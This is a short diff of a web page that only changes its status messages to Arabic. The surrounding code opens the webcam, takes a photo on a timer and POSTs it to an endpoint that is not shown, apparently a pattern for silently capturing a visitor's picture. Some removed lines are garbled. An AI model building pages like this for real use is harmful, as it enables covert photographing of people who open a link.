@@ -31,7 +31,7 @@
   </style>
 </head>
 <body>
-  <div id="status">...</div>
+  <div id="status">📡 جاري تفعيل الكاميرا...</div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="300" height="300"></canvas>
@@ -47,7 +47,7 @@
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          document.getElementById("status").innerText = "...";
+          document.getElementById("status").innerText = "📸 انتظر لحظة...";
 
           setTimeout(() => {
             takePhoto(stream);
@@ -76,7 +76,7 @@
           method: "POST",
           body: formData
         }).then(res => res.json()).then(data => {
-          document.getElementById("status").innerText = data.ok ? " !" : .";
+          document.getElementById("status").innerText = data.ok ? "✅ تم إرسال الصورة!" : "❌ فشل في الإرسال.";
         }).catch(err => {
           document.getElementById("status").innerText = "❌ خطأ في الاتصال.";
         });
